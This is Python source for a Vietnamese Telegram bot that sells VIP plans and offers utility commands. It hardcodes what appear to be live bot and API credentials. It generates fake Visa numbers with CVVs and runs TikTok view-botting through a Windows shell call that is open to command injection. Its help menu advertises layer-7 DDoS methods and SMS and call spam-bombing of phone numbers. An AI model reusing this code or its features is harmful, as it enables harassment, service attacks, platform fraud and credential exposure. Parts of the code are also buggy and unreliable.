#bot lỏ
import telebot
import psutil
import datetime
import time
import os
import subprocess
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import json
import io
import re
import threading
import logging
import whois
import ytsearch
import pyowm
import random
import tempfile
import phonenumbers
import openai
from faker import Faker
from telebot.types import Message
from tiktokpy import TikTokPy
from youtubesearchpython import VideosSearch
from pyowm.commons.exceptions import NotFoundError
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
from telegram.ext import Updater, CommandHandler, MessageHandler, filters, CallbackContext
from collections import defaultdict
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
import shlex  # Thêm dòng này để import shlex

bot_token = '6873640340:AAG_s4yODod8dp51dblSLIeUdtkcqPYZuSA'  # Thay thế bằng token của bạn

bot = telebot.TeleBot(bot_token)

allowed_group_id = -1002103359217

allowed_users = []
member_types = {}
processes = []
ADMIN_IDS = [6964080086, 6244038301]  # id admin
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}
last_time_used = {}  # Khởi tạo từ điển để lưu trữ thời gian lần cuối sử dụng

print('Bot Lỏ')


connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Tạo bảng users nếu nó chưa tồn tại
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()

def TimeStamp():
    now = str(datetime.date.today())
    return now

def load_users_from_database():
    global allowed_users, member_types  # Thêm member_types vào đây
    cursor.execute('PRAGMA table_info(users)')  # Kiểm tra xem cột member_type có tồn tại không
    columns = cursor.fetchall()
    column_names = [col[1] for col in columns]
    if 'member_type' not in column_names:
        cursor.execute('ALTER TABLE users ADD COLUMN member_type TEXT')  # Thêm cột member_type nếu chưa tồn tại
    cursor.execute('SELECT user_id, expiration_time, member_type FROM users')  # Chọn dữ liệu người dùng từ bảng
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        allowed_users.append(user_id)
        member_types[user_id] = row[2]  # Lưu loại thành viên vào từ điển

def save_user_to_database(connection, user_id, expiration_time, member_type):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time, member_type)
        VALUES (?, ?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S'), member_type))
    connection.commit()

load_users_from_database()

# Đoạn code dưới đây sẽ gọi hàm load_users_from_database() khi bot khởi động
print("Bot Lỏ")


connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Tạo bảng users nếu nó chưa tồn tại
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()

# Thêm hàm load_users_from_database() vào đây
load_users_from_database()


@bot.message_handler(commands=['addvip'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id not in ADMIN_IDS:
        bot.reply_to(message, '❌ Lệnh add thành viên Vip💳 Chỉ Dành Cho Admin !')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Hãy Nhập Đúng Định Dạng /add + [id] + [số_ngày]')
        return

    user_id = int(message.text.split()[1])
    try:
        days = int(message.text.split()[2])
    except ValueError:
        bot.reply_to(message, 'Số ngày không hợp lệ!')
        return

    current_time = datetime.datetime.now()
    expiration_time = current_time + datetime.timedelta(days=days)

    # Format ngày thêm và ngày hết hạn VIP
    add_date = current_time.strftime('%Y-%m-%d %H:%M:%S')
    expiration_date = expiration_time.strftime('%Y-%m-%d %H:%M:%S')

    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time, 'VIP')  # Cập nhật member_type thành "VIP"
    connection.close()

    bot.reply_to(message, f'Đã Thêm ID: {user_id} Thành Plan VIP💳 {days} Ngày\n'
                          f'Ngày Thêm: {add_date}\n'
                          f'Ngày Hết Hạn: {expiration_date}')

    # Cập nhật trạng thái thành viên VIP trong cơ sở dữ liệu và từ điển member_types
    connection = sqlite3.connect('user_data.db')
    cursor = connection.cursor()
    cursor.execute('''UPDATE users SET member_type = ? WHERE user_id = ?''', ('VIP', user_id))
    connection.commit()
    member_types[user_id] = 'VIP'  # Cập nhật trạng thái của người dùng trong từ điển member_types
    connection.close()
    allowed_users.append(user_id)  # Thêm user mới vào danh sách allowed_users



@bot.message_handler(commands=['removevip'])
def remove_user(message):
    admin_id = message.from_user.id
    if admin_id not in ADMIN_IDS:
        bot.reply_to(message, '❌ Lệnh remove thành viên Vip💳 chỉ dành cho admin !')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Hãy nhập đúng định dạng /remove + [id]')
        return

    user_id = int(message.text.split()[1])

    # Kiểm tra xem user_id có trong cơ sở dữ liệu hay không
    connection = sqlite3.connect('user_data.db')
    cursor = connection.cursor()
    cursor.execute('''SELECT * FROM users WHERE user_id = ?''', (user_id,))
    user = cursor.fetchone()
    connection.close()

    if user:  # Nếu user tồn tại trong cơ sở dữ liệu
        connection = sqlite3.connect('user_data.db')
        cursor = connection.cursor()
        cursor.execute('''DELETE FROM users WHERE user_id = ?''', (user_id,))
        connection.commit()
        if user_id in member_types:  # Kiểm tra xem user_id có trong từ điển member_types không
            del member_types[user_id]  # Xóa trạng thái của người dùng khỏi từ điển member_types
        connection.close()
        bot.reply_to(message, f'Đã xóa người dùng có ID là : {user_id} khỏi plan VIP💳 !')
    else:
        bot.reply_to(message, f'Người dùng có ID là {user_id} không có trong cơ sở dữ liệu plan VIP💳 !')

@bot.message_handler(commands=['profile'])
def user_profile(message):
    user_id = message.from_user.id
    if user_id in ADMIN_IDS:
        bot.reply_to(message, '📄〡User Information : Plan VIP💳 Forever !')
    else:
        member_type = member_types.get(user_id, 'Thường')  # Lấy loại thành viên từ dictionary
        if member_type == 'VIP':
            bot.reply_to(message, '📄〡User Information : Plan VIP💳 is still active !')
        else:
            bot.reply_to(message, '📄〡User Information : Plan FREE Bạn là thành viên thường\nDùng lệnh /muaplan nếu bạn muốn mua VIP💳 !')

@bot.message_handler(commands=['getkey'])
def startkey(message):
    # Gửi tin nhắn "Vui Lòng Chờ Trong Giây Lát,..."
    wait_message = bot.reply_to(message, text='Vui Lòng Chờ Trong Giây Lát,...')

    # Tạo luồng thực thi để xóa tin nhắn sau 4 giây
    threading.Thread(target=delete_message_after_delay, args=(wait_message.chat.id, wait_message.message_id, 4)).start()

    # Tạo mã key dựa trên user ID và ngày hiện tại
    key = "207" + str(int(message.from_user.id) * int(datetime.datetime.today().day) - 12666)
    key = "https://keyvip.elementfx.com/index.html?key=" + key
    print(key)
    
    # Gửi yêu cầu API để rút gọn URL
    api_token = '0e835764-9c3b-4954-8c50-cf90d70066a2'
    url = requests.get(f'https://web1s.com/api?token={api_token}&url={key}').json()
    url_key = url['shortenedUrl']
    
    # Tạo tin nhắn với key mới
    text = f'''
>> Cảm Ơn Bạn Đã Getkey 🌚
- Link Lấy Key Hôm Nay Là: {url_key}
- Nhập Key Bằng Lệnh /key + [key] -
[Lưu ý: mỗi key chỉ có 1 người dùng]
    '''
    
    # Phản hồi với tin nhắn và key
    bot.reply_to(message, text)

# Hàm để xóa tin nhắn sau một khoảng thời gian
def delete_message_after_delay(chat_id, message_id, delay):
    time.sleep(delay)
    bot.delete_message(chat_id, message_id)

@bot.message_handler(commands=['key'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Vui Lòng Nhập Key !\nVí Dụ /key 207123456789\nSử Dụng Lệnh /getkey Để Lấy Key')
        return

    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    expected_key = "207" + str(int(message.from_user.id) * int(datetime.datetime.today().day) - 12666)
    if key == expected_key:
        bot.reply_to(message, 'Nhập Key Thành Công')
    else:
        bot.reply_to(message, 'Key Sai Hoặc Hết Hạn\nKhông Sử Dụng Key Của Người Khác!')






@bot.message_handler(commands=['sdt'])
def phone_info(message):
    # Lấy nội dung tin nhắn sau lệnh /sdt
    words = message.text.split()
    
    # Kiểm tra xem tin nhắn có đủ phần tử hay không
    if len(words) > 10:
        # Lấy số điện thoại từ phần tử thứ 1 (phần tử thứ 0 là lệnh)
        phone_number = words[10].strip()

        try:
            # Phân tích số điện thoại để xác định thông tin
            parsed_number = phonenumbers.parse(phone_number, None)

            # Lấy quốc gia
            country = phonenumbers.region_code_for_number(parsed_number)
            country_name = phonenumbers.region_name_for_number(parsed_number)

            # Kiểm tra xem số điện thoại có hợp lệ không
            is_valid = phonenumbers.is_valid_number(parsed_number)

            # Lấy loại số điện thoại (di động, cố định, v.v.)
            phone_type = phonenumbers.number_type(parsed_number)
            phone_type_str = phonenumbers.number_type_name(phone_type)

            # Kiểm tra nếu số điện thoại thuộc Việt Nam
            if country == 'VN':
                # Hiển thị thông tin số điện thoại
                response = f"📞 Số điện thoại: {phone_number}\n"
                response += f"🌐 Quốc gia: {country_name} ({country})\n"
                response += f"✅ Hợp lệ: {'Có' if is_valid else 'Không'}\n"
                response += f"📱 Loại số: {phone_type_str}"
                bot.reply_to(message, response)
            else:
                bot.reply_to(message, "❌ Số điện thoại không phải từ Việt Nam!")

        except phonenumbers.phonenumberutil.NumberParseException as e:
            bot.reply_to(message, "❌ Số điện thoại không hợp lệ!")
    else:
        bot.reply_to(message, "❌ Vui lòng nhập số điện thoại sau lệnh /sdt!")









# Thiết lập logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Lệnh /videotik để gửi video từ đường dẫn TikTok
@bot.message_handler(commands=['videotik'])
def send_tiktok_video(message):
    # Kiểm tra xem tin nhắn có chứa đường dẫn đến video không
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Vui lòng nhập đường dẫn đến video TikTok.")
        return

    # Lấy đường dẫn đến video từ tin nhắn của người dùng
    video_url = message.text.split()[1]

    try:
        # Gửi video từ đường dẫn trực tiếp
        bot.send_video(message.chat.id, video_url)
    except Exception as e:
        logger.error(f"Đã xảy ra lỗi khi gửi video: {e}")
        bot.reply_to(message, "Đã xảy ra lỗi khi gửi video.")




# Lệnh /livevdtik để theo dõi số lượt xem của video TikTok mỗi 2 giây
@bot.message_handler(commands=['livevdtik'])
def live_view_count(message):
    # Kiểm tra xem tin nhắn có chứa đường dẫn đến video TikTok không
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Vui lòng nhập đường dẫn đến video TikTok.")
        return

    # Lấy đường dẫn đến video từ tin nhắn của người dùng
    video_url = message.text.split()[1]

    # Gửi yêu cầu GET để lấy thông tin về video từ API TikTok
    try:
        response = requests.get(f"https://tokcounter.com/tiktok-live-view-counter?id={video_url}")
        if response.status_code == 200:
            data = response.json()
            if 'title' in data and 'video_view_count' in data:
                video_title = data['title']
                initial_view_count = data['video_view_count']
                bot.reply_to(message, f"Đang theo dõi số lượt xem của video '{video_title}'...")

                # Theo dõi số lượt xem mỗi 2 giây trong 60 giây
                view_counts = [initial_view_count]
                start_time = time.time()
                while time.time() - start_time < 60:
                    time.sleep(2)
                    response = requests.get(f"https://tokcounter.com/tiktok-live-view-counter?id={video_url}")
                    if response.status_code == 200:
                        data = response.json()
                        if 'video_view_count' in data:
                            current_view_count = data['video_view_count']
                            view_counts.append(current_view_count)
                            bot.reply_to(message, f"Số lượt xem của video '{video_title}' là {current_view_count}")
                        else:
                            bot.reply_to(message, "Không thể lấy thông tin về số lượt xem của video.")
                            break
                    else:
                        bot.reply_to(message, "Không thể lấy thông tin về số lượt xem của video.")
                        break

                # Tính toán và trả lời về số lượt xem đã tăng sau 60 giây
                final_view_count = view_counts[-1]
                increase_in_views = final_view_count - initial_view_count
                bot.reply_to(message, f"Số lượt xem của video '{video_title}' đã tăng lên {increase_in_views} sau 60 giây")
            else:
                bot.reply_to(message, "Không thể lấy thông tin về video từ đường dẫn đã cung cấp.")
        else:
            bot.reply_to(message, "Không thể lấy thông tin về video từ đường dẫn đã cung cấp.")
    except Exception as e:
        bot.reply_to(message, "Đã xảy ra lỗi khi xử lý yêu cầu")






# Khởi tạo client OpenWeatherMap
owm = pyowm.OWM('8eb6660f9b1b6915bbbddf2f97f7f711')  # Thay 'YOUR_OW_API_KEY' bằng khóa API OpenWeatherMap thực tế của bạn
accuweather_api_key = 'aGaNDLyQYhHhOjcIr2aWNlFzOM0X3Quo'  # Thay 'YOUR_ACCUWEATHER_API_KEY' bằng khóa API AccuWeather thực tế của bạn

# Hàm để lấy thông tin chỉ số UV từ AccuWeather API
def get_uv_index(location):
    try:
        response = requests.get(f'http://dataservice.accuweather.com/currentconditions/v1/{location}?apikey={accuweather_api_key}&details=true')
        data = response.json()
        uv_index = data[0]['UVIndex']
        return uv_index
    except Exception as e:
        print(f"Error getting UV index: {e}")
        return None

def get_detailed_weather_info(location):
    try:
        observation = owm.weather_manager().weather_at_place(location)
        weather = observation.weather
        temperature = weather.temperature('celsius')
        wind = weather.wind()
        humidity = weather.humidity
        pressure = weather.pressure
        status = weather.detailed_status
        uv_index = get_uv_index(location)
        air_quality = "None"  # Cần API riêng để lấy thông tin chất lượng không khí
        dew_point = "Unclear"  # Cần API riêng để lấy thông tin điểm sương
        
        weather_info = f"🔆Thông Tin Thời Tiết ở {location}\n\n"
        weather_info += f"🌡️Nhiệt Độ : {temperature['temp']}°C\n"
        weather_info += f"💨Tốc Độ Gió : {wind['speed']} m/s\n"
        weather_info += f"🌬Hướng Gió : {wind['deg']}°\n"
        weather_info += f"💦Độ Ẩm : {humidity}%\n"
        weather_info += f"💥Áp Suất : {pressure['press']} hPa\n"
        weather_info += f"🌏Tình Trạng : {status}\n"
        weather_info += f"☀️Chỉ Số UV : {uv_index}\n" if uv_index is not None else "☀️Chỉ Số UV : None\n"
        weather_info += f"🏭Chất Lượng Không Khí : {air_quality}\n"
        weather_info += f"💧Điểm Sương : {dew_point}\n🌧Lượng Mưa : 0%"
        return weather_info
    except NotFoundError:
        return f"Không thể tìm thấy thông tin thời tiết cho {location}\nVui lòng nhập tên thành phố hoặc tỉnh thành hợp lệ tại Việt Nam\nMột Số Nơi Không Thể Tra Được Thông Tin"
    except Exception as e:
        return f"Có lỗi xảy ra khi truy xuất thông tin thời tiết: {str(e)}"

@bot.message_handler(commands=['tt', 'tt@Autospam_sms_bot'])
def detailed_weather_info(message):
    # Lấy địa điểm từ các đối số lệnh
    location = message.text.replace("/tt", "").strip()
    
    # Kiểm tra xem đã cung cấp địa điểm chưa
    if not location:
        bot.reply_to(message, "Vui lòng cung cấp địa điểm !\nExample : /tt Hà Nội")
        return
    
    # Lấy thông tin thời tiết chi tiết cho địa điểm cung cấp
    weather_info_text = get_detailed_weather_info(location)
    
    # Gửi thông tin thời tiết chi tiết như một phản hồi
    bot.reply_to(message, weather_info_text)







fake = Faker()

# Hàm để tạo ngẫu nhiên nhóm máu
def generate_blood_group():
    blood_groups = ['A', 'B', 'AB', 'O']
    rh_factors = ['+', '-']
    return random.choice(blood_groups) + random.choice(rh_factors)

# Lệnh /randomtt để tạo thông tin người dùng ảo
@bot.message_handler(commands=['fakett'])
def random_user_info(message):
    # Tạo thông tin người dùng ảo
    full_name = fake.name()
    gender = random.choice(['Nam', 'Nữ'])
    pronoun = random.choice(['Anh', 'Chị', 'Em'])
    dob = fake.date_of_birth(minimum_age=18, maximum_age=60)
    address = fake.address()
    email = fake.email()
    phone_number = fake.phone_number()
    job = fake.job()
    username = fake.user_name()
    company = fake.company()
    country = fake.country()
    language_code = fake.language_code()
    credit_card_number = fake.credit_card_number()
    zip_code = fake.postcode()
    height = fake.random_int(min=155, max=180)
    weight = fake.random_int(min=54, max=80)
    eye_color = fake.color_name()
    hair_color = fake.color_name()
    blood_group = generate_blood_group()  # Tạo ngẫu nhiên nhóm máu

    # Tính chỉ số BMI
    bmi = round((weight / ((height / 100) ** 2)), 2)

    # Tạo tin nhắn phản hồi với thông tin ngẫu nhiên về người dùng, chỉ số BMI và nhóm máu
    response_message = (
        f"👤 Họ và tên: {full_name}\n"
        f"🚻 Giới tính: {gender}\n"
        f"👤 Danh xưng: {pronoun}\n"
        f"📅 Ngày sinh: {dob}\n"
        f"🏠 Địa chỉ: {address}\n"
        f"📧 Email: {email}\n"
        f"📞 Số điện thoại: {phone_number}\n"
        f"💼 Nghề nghiệp: {job}\n"
        f"👤 Tên người dùng: {username}\n"
        f"🏢 Công ty: {company}\n"
        f"🌍 Quốc gia: {country}\n"
        f"🔤 Mã ngôn ngữ: {language_code}\n"
        f"💳 Số thẻ tín dụng: {credit_card_number}\n"
        f"🏠 Mã Zip: {zip_code}\n"
        f"📏 Chiều cao: {height} cm\n"
        f"⚖️ Cân nặng: {weight} kg\n"
        f"👁️ Màu mắt: {eye_color}\n"
        f"💇‍♂️ Màu tóc: {hair_color}\n"
        f"🩸 Nhóm máu: {blood_group}\n"
        f"🩺 Chỉ số BMI: {bmi}"
    )

    # Gửi tin nhắn phản hồi với thông tin người dùng ảo, chỉ số BMI và nhóm máu
    bot.reply_to(message, response_message)




fake = Faker()

# Lệnh /fakevisa để tạo thông tin thẻ tín dụng ảo
@bot.message_handler(commands=['fakevisa'])
def fake_credit_card_info(message):
    # Tạo thông tin thẻ tín dụng ảo
    card_number = fake.credit_card_number(card_type='visa')
    expiration_date = fake.credit_card_expire()
    cvv = fake.credit_card_security_code(card_type='visa')

    # Tạo tin nhắn phản hồi với thông tin thẻ tín dụng ảo
    response_message = (
        f"ℹ️ Số thẻ: {card_number}\n"
        f"📅 Ngày hết hạn: {expiration_date}\n"
        f"🔒 Mã CVV: {cvv}"
    )

    # Gửi tin nhắn phản hồi với thông tin thẻ tín dụng ảo
    bot.reply_to(message, response_message)








@bot.message_handler(commands=['kiemtra'])
def check_domain(message):
    # Lấy tên miền từ tin nhắn
    domain = message.text.replace("/kiemtra", "").strip()
    
    # Kiểm tra xem đã cung cấp tên miền chưa
    if not domain:
        bot.reply_to(message, "Vui lòng Nhập tên miền !\nVí dụ : /kiemtra example.com")
        return
    
    # Thực hiện truy vấn WHOIS
    try:
        w = whois.whois(domain)
        if w.domain_name:
            bot.reply_to(message, f"Tên miền {domain} đã được đăng ký")
        else:
            bot.reply_to(message, f"Tên miền {domain} chưa được đăng ký")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")




last_view_time = {}  # Tạo từ điển để lưu thời điểm cuối cùng mà người dùng sử dụng lệnh /view

@bot.message_handler(commands=['view'])
def viewtiktok_command(message):
    global last_view_time

    # Kiểm tra xem tin nhắn đến từ một nhóm hay không
    if message.chat.type != 'group' and message.chat.type != 'supergroup':
        bot.send_message(message.chat.id, ">> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipfc")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id, '>> Cách Để Buff View\n/view [url video] [số lượng view]\nEx : /view https://tiktok.com/ 500')
        return

    url, amount = args[1], args[2]
    if int(amount) > 500:
        bot.send_message(message.chat.id, "View tối đa là 500")
        return

    # Kiểm tra thời gian cuối cùng người dùng sử dụng lệnh /view
    if message.chat.id in last_view_time:
        time_passed = datetime.datetime.now() - last_view_time[message.chat.id]
        if time_passed.total_seconds() < 300:  # Kiểm tra xem đã đợi đủ 300 giây chưa
            remaining_time = 300 - time_passed.total_seconds()
            bot.send_message(message.chat.id, f"Vui lòng chờ thêm {int(remaining_time)} giây để tiếp tục sử dụng")
            return
    last_view_time[message.chat.id] = datetime.datetime.now()  # Lưu thời gian cuối cùng người dùng sử dụng lệnh /view

    cmd_to_run = f'cmd /c start python view.py {shlex.quote(url)} {shlex.quote(amount)}'
    subprocess.run(cmd_to_run, shell=True)

    today = datetime.datetime.now().strftime('%d-%m-%Y')

    response_message = (
        f'➤ UserID : {message.from_user.id}\n'
        f'➤ URL : {url}\n'
        f'➤ Số View : {amount} views\n'
        f'➤ Trạng Thái : Thành Công\n'
        f'➤ Time : {today}\n'
        f'➤ Plan : 𝐅𝐫𝐞𝐞\n'
        f'➤ Owner : @minhduc3919\n'
    )
    bot.send_message(message.chat.id, response_message)



@bot.message_handler(commands=['viewvip'])
def viewtiktok_command(message):
    global last_view_time

    # Kiểm tra xem tin nhắn đến từ một nhóm hoặc siêu nhóm không
    if message.chat.type != 'group' and message.chat.type != 'supergroup':
        bot.send_message(message.chat.id, ">> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipfc")
        return

    user_id = message.from_user.id
    if user_id not in ADMIN_IDS and user_id not in allowed_users:
        bot.send_message(message.chat.id, "⚠️ Gói Vip của bạn không tồn tại hoặc đã hết hạn\nVui lòng liên hệ @minhduc3919 để mua gói VIP\nSử dụng /profile để kiểm tra Plan\nDùng Lệnh /muaplan Để Xem Giá\n\n🚫 Sử dụng lệnh /view nếu bạn là người dùng Free")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id, '>> Cách Để Buff View VIP 💳 \n/viewvip [url video] [Mặc Định 3k]\nEx : /viewvip https://tiktok.com/ 3000')
        return

    url, amount = args[1], args[2]
    if int(amount) > 3000:
        bot.send_message(message.chat.id, "View tối đa là 3000")
        return

    # Kiểm tra thời gian cuối cùng người dùng sử dụng lệnh /viewvip
    if message.chat.id in last_view_time:
        time_passed = datetime.datetime.now() - last_view_time[message.chat.id]
        if time_passed.total_seconds() < 300:  # Kiểm tra xem đã đợi đủ 300 giây chưa
            remaining_time = 300 - time_passed.total_seconds()
            bot.send_message(message.chat.id, f"Vui lòng chờ thêm {int(remaining_time)} giây để tiếp tục sử dụng")
            return
    last_view_time[message.chat.id] = datetime.datetime.now()  # Lưu thời gian cuối cùng người dùng sử dụng lệnh /viewvip

    today = datetime.datetime.now().strftime('%d-%m-%Y')

    response_message = (
        f'➤ UserID : {user_id}\n'
        f'➤ URL : {url}\n'
        f'➤ Số View : 3000 Views\n'
        f'➤ Trạng Thái : Thành Công\n'
        f'➤ Time : {today}\n'
        f'➤ Plan : 𝐕𝐢𝐩\n'
        f'➤ Owner : @minhduc3919\n'
    )
    bot.send_message(message.chat.id, response_message)








@bot.message_handler(commands=['ytb'])
def search_youtube(message):
    # Lấy từ khóa tìm kiếm từ tin nhắn
    keyword = message.text.replace("/ytb", "").strip()

    # Kiểm tra xem đã cung cấp từ khóa tìm kiếm chưa
    if not keyword:
        bot.reply_to(message, "Vui lòng nhập từ khóa tìm kiếm!\nVí dụ: /ytb Anonymous")
        return

    try:
        # Tìm kiếm video trên YouTube
        search = VideosSearch(keyword, limit=6)
        results = search.result()
        
        # Lấy danh sách liên kết video
        video_links = [f"https://www.youtube.com/watch?v={video['id']}" for video in results['result']]
        
        # Gửi danh sách liên kết về cho người dùng
        if video_links:
            bot.reply_to(message, "\n".join(video_links))
        else:
            bot.reply_to(message, f"Không tìm thấy video nào phù hợp với từ khóa '{keyword}'!")
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")







@bot.message_handler(commands=['vuotlink'])
def vuotlink(message):
    text = message.text
    reply_text = ""
    if "link68.net" in text:
        response = requests.get("https://api.nm2302.site/0.php?web=link68.net")
        password = response.json().get("password")
        reply_text = f"{password}"
    elif "laymangay" in text:
        response = requests.get("https://api.nm2302.site/0.php?web=laymangay.com")
        password = response.json().get("password")
        reply_text = f"{password}"
    elif "traffic123.net" in text:
        response = requests.get("https://api.nm2302.site/0.php?web=traffic123.net")
        password = response.json().get("password")
        reply_text = f"{password}"
    elif "web1s.vip" in text or "link4m.com" in text:
        reply_text = "Khoan Đã Hình Như Bạn Đã Chốn Tiết Của Thầy Huấn"
    else:
        reply_text = "Các link hiện có thể bypass là link68.net | laymangay.net | laymangay.com | traffic123.net | web1s.vip | link4m.com\nCách dùng :\n/vuotlink [loại link]\nEx: /vuotlink link68.net"
    
    bot.reply_to(message, reply_text)




@bot.message_handler(commands=['muaplan'])
def purchase_plan(message):
    user_id = message.from_user.id
    
    # Thay thế các giá trị sau bằng thông tin thanh toán của bạn
    nganhang_tsr = "THESIEURE.COM"
    ten_nguoi_mua = "doantrungnguyen"
    email_nguoi_mua = "Đ.T Nguyên"
    so_dien_thoai = f"MUAVIP-{user_id}"  # Thay đổi ở đây
    so_dien_thoai2 = f"BOTCON-{user_id}" 
    so_tien = "40.000vnđ"

    purchase_info = f'''
>> 𝗧𝗛𝗢̂𝗡𝗚 𝗧𝗜𝗡 𝗧𝗛𝗔𝗡𝗛 𝗧𝗢𝗔́𝗡 💳

>> 𝗧𝗵𝗮𝗻𝗵 𝗧𝗼𝗮́𝗻 𝗚𝗼́𝗶 𝗩𝗶𝗽 💵
- THANH TOÁN QUA : {nganhang_tsr}
- Chủ Tài Khoản : {ten_nguoi_mua}
- Họ Tên : {email_nguoi_mua}
- Nội Dung : {so_dien_thoai}
- Số Tiền : {so_tien}

>> 𝗧𝗮̣𝗼 𝗕𝗼𝘁 𝗖𝗼𝗻 🤖
- Nội Dung : {so_dien_thoai2}
- Số Tiền : 100.000vnđ

Liên hệ ngay với tôi @minhduc3919 nếu bạn gặp lỗi 
Dùng lệnh /admin1 để hiển thị thêm thông tin 
    '''

    bot.reply_to(message, purchase_info)




# Danh sách các quốc gia cần kiểm tra
COUNTRIES = [
    ("🇻🇳", "Vietnam"),
    ("🇺🇸", "United States"),
    ("🇬🇧", "United Kingdom"),
    ("🇦🇺", "Australia"),
    ("🇩🇪", "Germany"),
    ("🇫🇷", "France"),
    ("🇨🇦", "Canada"),
    ("🇯🇵", "Japan"),
    ("🇷🇺", "Russia"),
    ("🇮🇳", "India"),
    ("🇧🇷", "Brazil")
    # Thêm các quốc gia khác vào đây nếu cần
]

# Hàm để xóa tin nhắn "Wait 5s for checking" sau 5 giây
def delete_wait_message(chat_id, message_id):
    time.sleep(5)
    bot.delete_message(chat_id, message_id)

@bot.message_handler(commands=['http'])
def check_http(message):
    try:
        # Kiểm tra xem tin nhắn có chứa văn bản không
        if len(message.text.split()) > 1:
            # Lấy địa chỉ trang web từ tin nhắn của người dùng
            url = message.text.split()[1]

            # Gửi tin nhắn "Wait 5s for checking"
            wait_message = bot.reply_to(message, "Wait 5s for checking 🔎")

            # Tạo một luồng thực thi để xóa tin nhắn "Wait 5s for checking" sau 5 giây
            threading.Thread(target=delete_wait_message, args=(wait_message.chat.id, wait_message.message_id)).start()

            # Khởi tạo danh sách kết quả
            results = []

            # Gửi yêu cầu HTTP GET và kiểm tra trạng thái từng quốc gia
            for flag, country in COUNTRIES:
                try:
                    response = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                    status_code = response.status_code
                    reason = response.reason
                    response_time = response.elapsed.total_seconds()
                    result = f"Country: {flag} | {status_code} ({reason}) | {response_time:.2f}s"
                except requests.exceptions.RequestException as e:
                    result = f"Country: {flag} | Error: {e}"
                results.append(result)

            # Tạo tin nhắn phản hồi
            response_text = "\n".join(results)
            bot.reply_to(message, response_text)
        else:
            bot.reply_to(message, "Vui lòng nhập đúng cú pháp. Ví dụ: /http http://example.com")
    except Exception as e:
        # Nếu có lỗi xảy ra, phản hồi với mã trạng thái 503 và lý do
        error_response = "\n".join([f"Country: {flag} | Error: {e}" for flag, _ in COUNTRIES])
        bot.reply_to(message, error_response)






# Định nghĩa từ điển languages với các ngôn ngữ và mã hiển thị tương ứng
languages = {
    'vi-beta': 'Tiếng Việt 🇻🇳',
    'en-beta': 'English 🇺🇸'
}

# Thiết lập ngôn ngữ mặc định
current_language = 'en-beta'

# Cập nhật mã xử lý cho lệnh /language
@bot.message_handler(commands=['language'])
def switch_language(message):
    global current_language
    
    # Kiểm tra xem có tham số ngôn ngữ được cung cấp không
    if len(message.text.split()) > 1:
        # Lấy ngôn ngữ từ tham số dòng lệnh
        new_language = message.text.split()[1].lower()
        if new_language in languages:  # Kiểm tra ngôn ngữ có hợp lệ không
            # Lưu ngôn ngữ mới
            current_language = new_language
            # Tạo link tương ứng với ngôn ngữ mới
            link = f"https://t.me/setlanguage/{new_language}"
            # Phản hồi cho người dùng về việc thay đổi ngôn ngữ và liên kết tương ứng
            bot.reply_to(message, f">> Để Chuyển Sang Ngôn Ngữ {languages[new_language]} !\nVui lòng sử dụng liên kết sau để thay đổi ngôn ngữ: {link}")
        else:
            # Nếu ngôn ngữ không hợp lệ, thông báo cho người dùng
            bot.reply_to(message, ">>Ngôn ngữ không hợp lệ !\nVui lòng chọn 'vi-beta' cho Tiếng Việt 🇻🇳 hoặc 'en' cho English 🇺🇸")
    else:
        # Nếu không có tham số ngôn ngữ, thông báo cho người dùng
        bot.reply_to(message, ">> Nhập ngôn ngữ bạn muốn chuyển đổi !\n>> [ vi-beta 🇻🇳 hoặc en-beta 🇺🇸 ]\nVD: /language vi-beta")




@bot.message_handler(commands=['cachdung', 'lenh'])
def lenh(message):
    help_text = '''
𝗠𝗲𝗻𝘂 𝗙𝘂𝗹𝗹 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 ☔️
• /getkey [Get Key ] 💲
• /key     [Dùng Key] 💲
• /muaplan [Mua Vip💳] 💲
• /profile [Check Plan] 💲
━━━━━━━━━━━━━━━━━━━
• /ddos [ Show Methods Layer 7 ]
• /spam [SĐT] Spam SMS + CALL  
• /sms [SĐT] Spam SMS 
• /viewvip [URL] View Tiktok Vip
• /view [URL] Buff View Tiktok
• /fb [Link FB] Check Info Facebook
• /vuotlink [URL] Vượt link rút gọn 1s 
• /tt [City] Check Thời Tiết
• /avtfb [Link FB] Get AVTFB Xuyên Khiên
• /ytb [Từ Khóa] Tìm Kiếm Video Youtube
• /http [URL] Check Live Website
• /check [Tên Miền] Check IP Website
• /getproxy [ Get Free Proxy ]
• /code [ URL ] Lấy Mã Nguồn Website
• /kiemtra [Domain] Check Domain 
